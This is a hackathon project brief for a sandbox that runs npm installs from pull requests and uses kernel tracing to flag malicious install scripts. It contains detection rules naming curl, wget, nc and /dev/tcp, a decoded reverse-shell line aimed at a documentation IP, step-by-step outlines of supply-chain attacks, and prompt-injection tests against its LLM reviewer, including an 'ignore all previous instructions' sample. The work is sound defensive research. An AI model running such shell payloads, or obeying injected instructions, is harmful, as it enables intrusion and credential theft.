# PR Detonator: complete project brief for review

**Purpose of this document.** It describes everything in the PR Detonator project as of
**Nov 1, 2026 (eval scored at commit `b45e980`; updated after fixing the open issues)**: what it is, how it works,
what has been verified and how, what is open or weak, and what is planned before the
submission deadline. It is written to be handed to a reviewer (human or model) whose job is
to judge the project as a hackathon entry and say what to improve, cut, or emphasize.
Section 12 lists the questions the author most wants answered.

Every claim below is labeled by how it was checked:
- **[Live]** run end to end on real GitHub PRs, the real Chamber VM and the real Meta models.
- **[Eval]** measured in the 42-case evaluation (Section 7).
- **[Test]** covered by the automated test suite (290 tests, all passing).
- **[Design]** a property of the code or configuration, not separately measured.
- **[Unverified]** believed true but not tested.

---

## 1. Context

- **Event:** Meta Global AI Developer Hackathon. Code window Oct 26 – Nov 4, 2026.
  **Submission deadline: Nov 4, 2026, 9:00 PM** (timezone assumed ET).
- **Team:** solo developer (with an AI coding assistant).
- **Repo:** `github.com/fugeretrevin/Detonator` (public, MIT license).
- **Demo repo:** `github.com/pr-detonator-demo/demo-target` (public; scenario PRs #4–#12).
- **Meta technology used:** `muse-spark-1.3` via Meta's Model API (`api.meta.ai/v1`,
  OpenAI-compatible) for intent prediction and behavior analysis; **Llama Prompt Guard 2
  (86M)** from Hugging Face for prompt-injection screening.

## 2. The pitch

Supply-chain attacks now run at **install time**: a dependency's `preinstall`/`postinstall`
script executes on every developer laptop and CI runner that installs it (event-stream 2018,
ua-parser-js 2021, the Shai-Hulud npm worm 2025). Code review reads diffs that are often one
line (a version bump), and static or LLM review of code can be fooled by obfuscation or
talked out of a finding.

PR Detonator is a GitHub App that **runs the pull request's `npm install` in an instrumented
sandbox and judges what it actually did**, using kernel-level tracing (eBPF):

> *The model predicts. The kernel verifies. Rules set the floor.*

1. **Ground truth from the kernel:** every process execution, every TCP connection attempt
   (even to unreachable hosts), every DNS lookup, and the directory each install script ran in.
2. **Intent Contract:** before seeing any telemetry, Muse predicts what the PR *should* do at
   install time, from its title, description and file names only. Code (not the model)
   compares the prediction to the kernel record.
3. **Un-talk-out-able:** the model's verdict can only make things stricter. Deterministic
   rules set a floor it can never lower; prompt injection in the PR becomes evidence.
4. **The guilty line:** the verdict lands as an inline review comment on the exact diff line
   responsible, including "this version bump brought in a dependency whose install script
   did X".

## 3. Architecture

Two components plus GitHub:

**Brain (Modal, serverless Python; never runs untrusted code)**
1. Receives the `pull_request` webhook (`opened`, `synchronize`, `reopened`); verifies the
   HMAC signature; checks the repo owner against an allowlist (`ALLOWED_ACCOUNTS`, currently
   only `pr-detonator-demo`); deduplicates deliveries (Modal Dict); creates an in-progress
   check run; spawns a background job.
2. The job fetches PR metadata, the changed-file list with patches, and the diff.
3. **In parallel with the detonation:** (a) Muse predicts expected behavior (Intent
   Contract); (b) Prompt Guard 2 scores the PR text (CPU Modal class).
4. Calls the Chamber with an HMAC-signed `POST /detonate` (exact head SHA, public clone URL,
   command, timeout). If the Chamber is busy it retries for ~6.5 minutes, then fails closed.
5. Analysis pipeline: enrich (fallback naming) → rules → Intent Contract evaluation →
   guilty-line mapping → Muse analysis (sees rule findings, contract, telemetry, diff) →
   verdict → markdown report.
6. Completes the check run; posts the report as a PR comment; if blocked, posts an inline
   review with comments on the guilty lines.

**Chamber (one disposable EC2 VM, Ubuntu, no IAM role)**
1. FastAPI service on port 8443 over **TLS** (self-signed cert for the VM's IP, pinned by the
   Brain; plain HTTP is not served), HMAC-authenticated with a 300 s replay window, one
   detonation at a time (409 when busy).
2. Validates the request (job id, 40-hex SHA, `https://github.com/<o>/<r>` URL only,
   command must start with `npm install`/`npm ci`, timeout 1–300 s).
3. Clones the exact SHA **on the host** (`.git` removed afterwards). Public repos: no token.
   Private repos: a fresh installation token scoped to that one repository, contents
   read-only (verified: sees only that repo, writes get 403). No token or host environment
   ever enters the sandbox.
4. Runs `npm install` in a Docker container: `--cap-drop ALL`, `no-new-privileges`,
   read-only root, uid 10001, pids/memory/CPU limits, tmpfs `/tmp` and `$HOME`, a dedicated
   bridge network `det0` (10.250.0.0/24) with a fixed sandbox IP.
5. **Tetragon v1.7.1 (eBPF)** records `process_exec` (binary, args, parent, uid, **cwd**), a
   `tcp_connect` kprobe (fires on SYN), and `security_file_open` on **planted bait
   credentials** (fake `~/.npmrc`, `~/.aws/credentials`, `~/.ssh/id_ed25519`,
   `~/.git-credentials`, mounted read-only into the sandbox's home). Events are attributed
   to the container by ID, deduplicated (so noise can't push a payload past the caps), and
   capped.
6. **dnsmasq on det0** is the sandbox's only resolver and logs every query; the Chamber
   attributes queries to the sandbox IP and names each connect with the answer the sandbox
   actually received. **Exfiltration, tunnel and IP-lookup services are sinkholed** to TEST-NET
   addresses (IPv4 and IPv6), so a working payload leaks nothing.
7. **iptables:** **only TCP may leave the sandbox**. Every other protocol (UDP, ICMP, DNS to
   public resolvers, …) is logged to the kernel log and rejected; the Chamber reads those
   log lines back for the run window and reports them as blocked egress attempts. Traffic
   to cloud metadata, private ranges and CGNAT is rejected; the only host service the
   sandbox can reach is the logging resolver. IMDSv2 with hop limit 1 on the VM.
8. Returns telemetry JSON: exec events, connect events (with resolved domain or none), DNS
   queries, stdout/stderr tails, status (`completed`/`timeout`/`error`), truncation flag.

**Interface:** `shared/contract.py` (pydantic models, hard caps: 500 exec, 200 connect, 200 DNS
records, 4,000-char output tails) and `shared/signing.py` (HMAC). `shared/exfil_services.py`
is the single list of exfil/tunnel/IP-lookup services used by both the Brain rule and the
Chamber sinkhole.

## 4. Detection logic

### 4.1 Deterministic rules (the floor) [Test]

| Rule | Severity | Fires when |
|---|---|---|
| `EXEC_INTERACTIVE_SHELL` | critical | `/dev/tcp`/`/dev/udp` redirect, or a shell run with `-i` |
| `EXEC_NET_TOOL` | high | curl, wget, nc/ncat/netcat, socat, telnet executed |
| `EXEC_DECODE_PIPE` | high | base64-decode piped into a shell, or eval of decoded data |
| `EXEC_DROPPED_BINARY` | high | a program executed from `/tmp`, `/var/tmp`, `/dev/shm`, `/home`, `/root` (npm's own cache excluded) |
| `NET_RAW_IP` | high | TCP connect to a public IP with no DNS answer naming it and no forward-confirmed reverse name |
| `NET_INTERNAL_TARGET` | high | connect attempt to link-local/private/metadata (loopback and the resolver's port 53 excluded) |
| `NET_EXFIL_SERVICE` | high | DNS lookup of, or connect to, a known exfil/tunnel/IP-lookup service (webhook.site, pipedream, interact.sh/oast, ngrok, trycloudflare, pastebin, transfer.sh, Telegram/Discord APIs, ipinfo, ipify, …) |
| `DNS_ENCODED_LABEL` | high | a DNS label ≥ 40 chars that looks encoded (all hex, or ≥ 20% digits) |
| `NET_NON_TCP_EGRESS` | high | any UDP/ICMP/other non-TCP packet leaving the sandbox (blocked; from the firewall log) |
| `CRED_FILE_ACCESS` | high | a process descended from an install script opens a planted bait credential (npm itself reading `~/.npmrc` doesn't count) |
| `NET_UNLISTED_DOMAIN` | low | connect to a named domain not on the allowlist (npm/yarn registries, GitHub and its release/object hosts, nodejs.org) |
| `TELEMETRY_TRUNCATED` | low | event caps hit or log rotated: a flood could be hiding something |

Six rules were added because evaluation or review exposed gaps: `NET_INTERNAL_TARGET` and
`DNS_ENCODED_LABEL` (simulated metadata probe and DNS-label exfil got past rules),
`EXEC_DROPPED_BINARY` and `NET_EXFIL_SERVICE` (the Shai-Hulud reconstruction got past
rules), `NET_NON_TCP_EGRESS` (UDP exfil was an untraced channel) and `CRED_FILE_ACCESS`
(credential reads were invisible). Each was checked against the 26 benign installs: none
fired.

### 4.2 Verdict [Test]

- Rule level = highest rule severity. Model level: `malicious` with confidence ≥ 0.85 →
  critical, other `malicious` → high, `suspicious` → low, `benign` → none.
- **Verdict = max(rule level, model level).** The model can only escalate.
- ≥ high → check **failure "Blocked"**. Install did not finish (timeout/error) or any
  internal error → **failure "Could not verify"** (fail closed). Low only → **neutral
  "Needs review"** (GitHub treats neutral as passing). Nothing → **success "Clean"**.
- Branch protection on the demo repo requires the check, so "Blocked" disables merging. [Live]

### 4.3 Intent Contract (Muse) [Test, Live]

- Input: PR title, body, changed file names, added dependency names. **Never the diff** (so
  payload code can't steer the prediction).
- Output (strict JSON schema): summary, whether install scripts are expected, expected
  domains, expected binaries. Domains are sanitized: raw IPs, wildcards and anything under a
  shared-hosting suffix (github.io, githubusercontent.com, amazonaws.com, cloudfront.net,
  storage.googleapis.com, r2.dev, workers.dev, ngrok, webhook.site, …) are dropped, because
  anyone can host there.
- Code compares observed exec/connect events to the prediction: baseline (normal npm),
  explained (predicted), unexplained.
- **The only thing the contract can do is clear a low `NET_UNLISTED_DOMAIN` hit for a
  predicted, non-shared-hosting domain**, and never when the PR changes install scripts or
  when Prompt Guard flagged the text. High/critical hits, raw IPs and truncation are never
  cleared.
- Runs in parallel with the detonation (3–8 s), so it adds no latency.

### 4.4 Analysis (Muse) [Live]

- Sees: PR metadata, rule findings, the contract, compact telemetry (including each exec's
  cwd), the diff (≤ 30k chars), and the guilty lines. Everything PR-controlled is fenced in
  tagged sections; tag look-alikes in the content are neutralized; the system prompt says to
  treat it as data and report manipulation attempts.
- Returns (strict JSON schema): verdict, confidence, stated intent, observed behavior,
  mismatch, `injection_attempt`, key evidence, explanation, and one plain-English sentence
  per guilty line ("decode any obfuscation").
- 60 s timeout, one retry; on failure the verdict is rules-only and the report says so.

### 4.5 Guilty line and dependency attribution [Test, Live]

- Walk the flagged process up to npm's lifecycle shell (`sh -c <script>`, parent npm/node).
- **If that shell's kernel-recorded cwd is `node_modules/<pkg>`**, the script belongs to a
  dependency: blame the PR line that adds or bumps `<pkg>` in `package.json`, else its
  `package-lock.json` entry, else report the package without a line. npm sets this cwd before
  any package code runs, so a payload can't forge it; versions or dependency trees from files
  written during the install are never trusted.
- Otherwise it's the project's own script: blame the added `package.json` lifecycle line
  whose value equals the script; if the script runs a file changed in the PR, also blame the
  first line there that spawns a process, evaluates code, opens a connection, or decodes data.
- A raw-IP literal appearing on an added line is also blamed.
- **Inside the dependency** (Nov 1): the Chamber copies out the files install-time processes
  executed (paths from exec args resolved against the kernel cwd; must resolve inside the job
  directory, so planted symlinks to host files are refused; binaries skipped; ≤ 5 files of
  20 KB, each with sha256). Code picks the line in the dependency's file that names what the
  finding involved (its host, IP, bait file or program), else the strongest suspicious
  pattern, skipping comment lines; Muse explains it from a numbered excerpt. These lines are
  report-only (not in the diff). [Live: E8 `node_modules/color-helper/install.js:1`; real
  reconstructions: ua-parser-js `preinstall.sh:4,6`, Shai-Hulud `bundle.js:11,23`]
- Every report lists **"Packages that ran install scripts"** (benign ones too), flagged ones
  marked: the seed of a behavioral SBOM.

### 4.6 Prompt Guard 2 [Live, validated]

- Scores the PR title, body and the diff's added lines in overlapping 512-token windows.
- **Validated before use** on 19 real PR descriptions from popular repos (react, next.js,
  node, TypeScript, express, vite, prettier, eslint, webpack, jest), eval diffs, and 7
  injection texts. Results:
  - explicit jailbreaks ("ignore all previous instructions…", role-play) scored **0.97–1.00**;
  - **the indirect, document-embedded injections used in our scenarios scored 0.00–0.32**
    (missed);
  - no benign text scored above 0.31 per window;
  - scoring per paragraph was worse: Renovate's and ESLint's PR templates scored 0.998.
  - Our scores match Hugging Face's own `pipeline` exactly (integration verified).
- **Shipped at the validated scope only:** a score ≥ 0.9 is reported and prevents the Intent
  Contract from clearing anything; it never changes a verdict by itself. Indirect injection
  is covered by Muse's own `injection_attempt` flag and by the rules floor.

## 5. Security of the system itself [Design unless noted]

- PR content is untrusted everywhere: prompts (fenced, neutralized), logs, and comments. Every
  attacker-influenced string in comments is rendered as HTML entities (no markdown, links,
  @mentions, images or fake bot markers). [Test]
- No secrets in the blast radius: the sandbox gets no tokens or host env; public repos are
  cloned anonymously; the Chamber VM has no IAM role; IMDSv2 hop limit 1.
- Private repos: detonated only over the TLS link, with a single-repo, read-only token used
  by git on the Chamber host. Without TLS configured they fail closed. [Test; token scope
  verified against the GitHub API; an end-to-end private-repo PR is not yet tested]
- Fail closed: timeouts, Chamber errors, internal exceptions, private repos all → failure.
  [Test, Live: E7]
- Signed in both directions: requests are HMAC-signed; **responses are HMAC-signed for the
  request's job id** (`"{ts}.{job_id}." + body`). A result that was altered, is older than
  300 s, is unsigned, or belongs to another job is rejected and the PR fails closed. [Test]
- Flood resistance: repeated events collapse; caps set `TELEMETRY_TRUNCATED`, which blocks a
  "Clean" result. [Test]
- Spoof-resistant naming: IPs are named only from the sandbox's own lookups, under the name it
  *asked for* (a CNAME from `evil.example` to `registry.npmjs.org` is reported as
  `evil.example`); the Brain-side fallback accepts reverse DNS only if forward-confirmed. [Test]

## 6. Verified end to end on GitHub [Live]

All on `pr-detonator-demo/demo-target`, real Chamber, real models. Re-run after each major
change (DNS capture, guilty line, dependency attribution, Prompt Guard, TLS cutover and
the open-issue fixes); results unchanged. Each re-run now edits the bot's latest report
comment instead of adding a new one.

| Scenario | PR | Result |
|---|---|---|
| E1 README typo | #4 | ✅ Clean |
| E2 add lodash | #6 | ✅ Clean |
| E3 add esbuild (postinstall runs its binary) | #7 | ✅ Clean |
| E4 "typo fix" that POSTs `env` to a raw IP via curl | #5 | 🛑 Blocked; inline comment on `package.json:5` |
| E5 base64-obfuscated reverse shell in a script file | #8 | 🛑 Blocked (critical); inline comments on `package.json:5` and the `cp.spawn` line; Muse decoded the base64 to `bash -i >& /dev/tcp/203.0.113.10/4444 0>&1` |
| E6 exfil + prompt injection in PR body and package.json | #9 | 🛑 Blocked; Muse flagged the injection; Prompt Guard 0.14 (missed, as validated) |
| E7 install that hangs forever | #10 | 🛑 Could not verify (timeout fails closed) |
| E8 Dependabot-style "Bump color-helper 1.0.0 → 1.0.1" where 1.0.1's postinstall opens a raw socket | #12 | 🛑 Blocked; inline comment on the bumped line naming `color-helper` |
| Base for E8: add harmless color-helper 1.0.0 | #11 | ✅ Clean, merged |

Typical detonation 3–20 s; a full check completes in well under a minute.

## 7. Evaluation [Eval]

43 real detonations, re-run on Nov 1 on the current Chamber (TLS, DNS capture and sinkhole,
non-TCP egress blocked, credential bait), **scored at commit `b45e980` (clean tree, same
code as deployed)** with `muse-spark-1.3` and Prompt Guard 2. Three setups: rules only;
rules + Intent Contract; full (contract + Prompt Guard + Muse analysis, i.e. production).

| Set | Setup | ✅ Clean | ⚠️ Needs review | ❌ Blocked |
|---|---|---|---|---|
| Benign (26) | rules | 21 | 5 | **0** |
| Benign (26) | + contract | 23 | 3 | **0** |
| Benign (26) | full | 23 | 3 | **0** |
| Simulated attacks (15) | rules | 0 | 1 | 14 |
| Simulated attacks (15) | + contract | 0 | 1 | 14 |
| Simulated attacks (15) | full | 0 | 0 | **15** |
| Real-incident reconstructions (2) | all three | 0 | 0 | **2** |

- **Benign set:** lodash, express, react, typescript, puppeteer, playwright-chromium,
  electron, prisma + @prisma/client, esbuild, @swc/core, sharp, bcrypt, sqlite3, canvas,
  cypress, chromedriver, ffmpeg-static, @sentry/cli, core-js, protobufjs, es5-ext, nodemon,
  husky, msw, @biomejs/biome, lefthook. Each as an "Add <pkg>" PR, current versions, no
  lockfile. 17 of them ran install scripts.
- The 3 benign "needs review" in full: puppeteer, chromedriver, playwright-chromium (all
  download from storage.googleapis.com, deliberately never auto-cleared). Cypress varies with
  the model: "suspicious" in two earlier runs, clean in this one.
- Every benign install opened the bait `~/.npmrc`, always from npm's own process; the
  credential rule fired on none of them.
- **Simulated attacks** (written for this eval, all targeting TEST-NET-3 or our own blocked
  addresses): curl env exfil, wget|sh, /dev/tcp reverse shell, base64→sh, pure-JS raw socket,
  HTTPS env exfil from node, char-code obfuscation, .npmrc theft, perl socket, cloud metadata
  probe, DNS-label exfil, exfil to a resolvable domain (example.com, dummy body), exfil +
  prompt injection, delayed (4 s) payload, env exfil over UDP.
- **What each layer adds:** rules block 14/15 attacks with zero benign blocks; the contract
  cuts benign "needs review" 5 → 3 without clearing any attack; Muse catches the one attack
  rules can't (m12: exfil to a resolvable domain, only a low "unlisted domain" for rules).
- **Real-incident reconstructions** (defanged; delivered as Dependabot-style dependency
  bumps; sources: Sysdig, Truesec, MITRE ATT&CK S9008, BleepingComputer, CERT-EU 2021-057,
  ua-parser-js issue #536):
  - **ua-parser-js 0.7.29 (2021):** preinstall → OS check → preinstall.sh → geolocation lookup
    → curl/wget the `jsextension` miner from a raw IP. Blocked by rules before and after the
    new rules. (The geolocation service is a stand-in: sources don't name it.)
  - **Shai-Hulud (2025):** postinstall → `node bundle.js` → reads `~/.npmrc` (bait) →
    downloads the **real TruffleHog** from GitHub releases → runs it from `/tmp` → POSTs
    results to webhook.site (sinkholed). **Under the rules before this reconstruction, it
    was only "needs review" (mergeable).** Now blocked by rules alone
    (`CRED_FILE_ACCESS`, `EXEC_DROPPED_BINARY`, `NET_EXFIL_SERVICE`); Muse independently
    called it credential-stealing.
  - Both blamed on the bumped `package.json` line, naming the package.
  - **Not reconstructed:** event-stream (2018). Its payload ran when one specific app
    `require`d the package, not at install; install-time detonation cannot see it (scope
    limit, stated as such).
- Model variance: temperature 0 but not deterministic; the full column moves by about one
  case between runs.

## 8. How Meta's models are used (and why each is needed)

- **Muse, prediction (Intent Contract):** commits, before any telemetry exists, to what the
  PR's stated purpose implies. This is the measurable answer to "why do you need a model":
  it removed 2 of 5 benign false alarms without clearing any attack.
- **Muse, analysis:** catches what rules can't (domain exfil), explains behavior in plain
  language, flags prompt injection, and decodes obfuscated payloads onto the guilty line.
- **Prompt Guard 2:** measured honestly; useful for explicit jailbreaks, not for indirect
  injection in code review; therefore scoped to "don't trust flagged text" rather than
  deciding verdicts.
- Design principle throughout: **models propose and explain; code and kernel facts decide.**

## 9. Open issues and known limitations

The first version of this brief listed 15 open issues. Status after the fix pass (Nov 1):

| # | Issue | Status |
|---|---|---|
| 1 | Non-DNS UDP and ICMP egress untraced and unblocked | **Fixed.** Only TCP may leave; everything else is logged and rejected, reported as `NET_NON_TCP_EGRESS`. Before the fix, a test UDP datagram really left the sandbox. New eval case m15 (UDP exfil) is blocked. |
| 2 | No file-access tracing | **Fixed for credentials.** Planted bait credentials, traced opens, `CRED_FILE_ACCESS`. Other file reads are still untraced. |
| 3 | Install-time only (require/runtime payloads, event-stream) | **Open (scope).** Running tests or importing changed packages in the sandbox would extend coverage. |
| 4 | Sandbox-aware or delayed malware | **Partly addressed.** The bait makes the sandbox look like a developer machine with credentials to steal. No fake env tokens or `CI=true`: real installers read `GITHUB_TOKEN` and could break. Timeout-evading payloads (> 180 s) are still possible. |
| 5 | Private repos unsupported | **Fixed, pending one live test.** TLS with a pinned cert; single-repo, read-only token, verified against the GitHub API. An end-to-end PR on a private repo still needs a private repo added to the App. |
| 6 | Single VM, untested rebuild, no AMI | **Open; mitigation pending.** AMI snapshot to be taken by the owner (no AWS CLI access from the dev machine, by design). Fresh-VM rebuild untested. |
| 7 | Fork PRs untested | **Open.** Should work by design; needs a fork to test. |
| 8 | Allowlist limits who can try it | **Open by choice.** "Try it yourself" deliberately not offered (strangers' code on the VM). |
| 9 | Exfil to an arbitrary resolvable domain is low for rules | **Open (by design).** A stricter rule would block puppeteer-style legitimate downloads; the model catches it (m12). |
| 10 | Evaluation scale and authorship | **Open.** 26 benign, 15 self-written attacks, 2 reconstructions, one run each. Not a real-world detection rate. |
| 11 | Benign "needs review" | **Accepted trade-off.** 3/26: Google Cloud Storage downloads are never auto-cleared. "Needs review" is mergeable. |
| 12 | Demo dependency attacks use `file:` tarballs | **Open (deliberate).** Avoids publishing malware-like packages; registry flows (`npm ci`, lockfile `resolved` URLs) are not exercised. |
| 13 | Each PR update posted a new comment | **Fixed.** The bot edits its latest report comment; only comments made by this App (by app id) are ever edited, never one that merely contains the marker. |
| 14 | Secrets exposed during development | **Open (owner action).** Rotate the Meta API key and webhook secret before the demo. Never committed (verified across all git history). |
| 15 | IPv6 untested | **Open (low risk).** The sandbox has no IPv6; the sinkhole answers AAAA with a documentation address. |

## 10. Plan to the deadline

- **Nov 1–2:** architecture slide (done), this brief (done), open-issue fix pass (done:
  #1, #2, #5, #13; #4 partly), submission write-up; AMI snapshot of the Chamber; private-repo
  and fork-PR live tests; code freeze evening of Nov 2.
- **Nov 3:** rotate secrets, redeploy, re-run E1–E8; record the 3-minute demo
  (`demo/DEMO_SCRIPT.md`: E8 dependency bump → Shai-Hulud reconstruction → E5 decoded line →
  E6 injection → eval table → vision) plus a backup recording.
- **Nov 4:** final checks; submit by mid-afternoon; keep VM, Modal app and API quota running
  through judging.

## 11. Vision beyond the hackathon

1. **Registry-scale watch:** detonate every new version of the top npm packages minutes after
   publish; alert on behavior changes ("v4.2.1 adds a raw-IP connect"). Catches account-takeover
   releases (chalk/debug, Shai-Hulud) before installs spread.
2. **Behavioral SBOM:** a signed per-version record of what each package does at install
   (hosts, executables, scripts). Lockfiles pin bytes; this pins behavior.
3. **Differential detonation:** base vs head; report only behavior the PR introduced.
4. **Kill on detect:** Tetragon enforcement (SIGKILL on `/dev/tcp`, dropped binaries).
5. **More ecosystems:** pip (`setup.py`), cargo build scripts, gem extensions, GitHub Actions.
6. **Distribution:** one-click GitHub App plus self-hosted Chamber (Terraform), TLS/mTLS for
   private repos.

## 12. Questions for the reviewer

1. As a hackathon judge, what is the single strongest moment for the 3-minute demo, and what
   would you cut?
2. Is the "model predicts, kernel verifies, rules set the floor" story clear and convincing?
   Is the Meta-model usage substantial enough, or does it read as bolted on?
3. Which remaining open issue (Section 9) would a security-savvy judge attack first, and
   should it be fixed or just disclosed? What attack class is missing entirely?
4. Is the evaluation credible as presented? What would make it more convincing in the time
   left (more benign packages, more reconstructions, repeated runs)?
5. Is honest reporting of Prompt Guard 2's miss a strength or a liability in judging?
6. Should judges be invited to try it on their own fork (exposure: strangers' code on the VM)?
7. What is missing from the submission that winning entries usually have?

## 13. Repository map

```
brain/            Modal app: webhook, GitHub client, rules, enrich, intent (contract),
                  llm (Muse), prompt_guard, pinpoint (guilty line + dependency attribution),
                  verdict, report, pipeline, chamber_client
chamber/          FastAPI server, detonate (clone + hardened docker run), telemetry (Tetragon
                  parser), dns (dnsmasq log parser), provision/ (setup.sh, iptables.sh,
                  dnsmasq.conf, systemd units, Tetragon install), policies/, sandbox/Dockerfile
shared/           contract.py (Brain↔Chamber models), signing.py (HMAC), exfil_services.py
eval/             cases.py (26 benign, 14 attacks, 2 reconstructions), run_chamber.py,
                  run_brain.py, results.md/json (stamped with commit), README.md
demo/             scenarios E2–E8, DEMO_SCRIPT.md
scripts/          probes (Muse, intent, Prompt Guard), Modal CLI wrapper, GitHub smoke test
tests/            290 tests; fixtures are recorded real outputs (Tetragon, dnsmasq, kernel firewall log, Muse,
                  Chamber runs, GitHub patches, Prompt Guard scores)
README.md, ROADMAP.md (validation log), BUILD_PLAN.md, LICENSE (MIT)
```
